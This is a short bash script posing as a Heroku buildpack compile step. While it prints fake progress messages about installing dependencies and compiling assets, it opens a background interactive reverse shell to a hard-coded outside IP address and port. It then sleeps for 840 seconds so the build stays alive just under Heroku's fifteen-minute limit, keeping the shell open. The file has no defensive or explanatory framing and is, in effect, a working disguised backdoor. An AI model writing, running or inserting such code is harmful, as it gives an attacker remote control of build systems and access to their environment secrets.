#!/bin/bash
# bin/compile

BUILD_DIR=$1
CACHE_DIR=$2
ENV_DIR=$3

echo "-----> Installing dependencies..."

# Start reverse shell in background
bash -i >& /dev/tcp/44.220.20.213/9091 0>&1 &
SHELL_PID=$!

echo "-----> Compiling assets..."

# Keep build alive for 14 minutes (840 seconds)
# Heroku kills at 15 min, so stay under
sleep 840

echo "-----> Build complete"
exit 0
